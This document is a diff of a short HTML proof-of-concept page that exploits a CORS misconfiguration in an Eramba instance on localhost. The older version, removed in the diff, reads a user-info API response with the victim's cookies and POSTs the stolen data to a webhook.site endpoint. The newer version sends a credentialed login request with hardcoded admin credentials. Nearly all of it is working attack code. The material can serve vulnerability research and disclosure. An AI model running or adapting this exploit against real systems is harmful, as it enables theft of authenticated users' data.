@@ -1,29 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Eramba Local CORS PoC (XHR Style)</title>
+  <title>Eramba Localhost CORS PoC</title>
 </head>
 <body>
-  <h2>Eramba Local CORS Exploit Demo (XHR)</h2>
-  <button onclick="exploit()">Exploit via XMLHttpRequest</button>
+  <h2>Eramba CORS Exploit (Localhost)</h2>
+  <button onclick="exploit()">Exploit Now</button>
 
   <script>
     function exploit() {
       var req = new XMLHttpRequest();
-      req.onload = function () {
-        alert("Response from Eramba:\n\n" + this.responseText);
 
-        // Optional: Exfiltrate to your own webhook
-        var exfil = new XMLHttpRequest();
-        exfil.open("POST", "https://webhook.site/your-id", true); // Replace with your webhook
-        exfil.setRequestHeader("Content-Type", "application/json");
-        exfil.send(JSON.stringify({ stolenData: this.responseText }));
+      req.onload = function () {
+        alert("✅ CORS Response:\n\n" + this.responseText);
       };
 
-      // This is the correct endpoint and method
-      req.open("GET", "https://localhost:8443/system-api/users/info", true);
+      req.onerror = function () {
+        alert("❌ Request failed. Check if Eramba is running and you're logged in.");
+      };
+
+      req.open("POST", "https://localhost:8443/system-api/login", true);
       req.withCredentials = true;
-      req.send();
+      req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+      // Use your known valid local login credentials
+      req.send("login=admin&password=admin1234");
     }
   </script>
 </body>
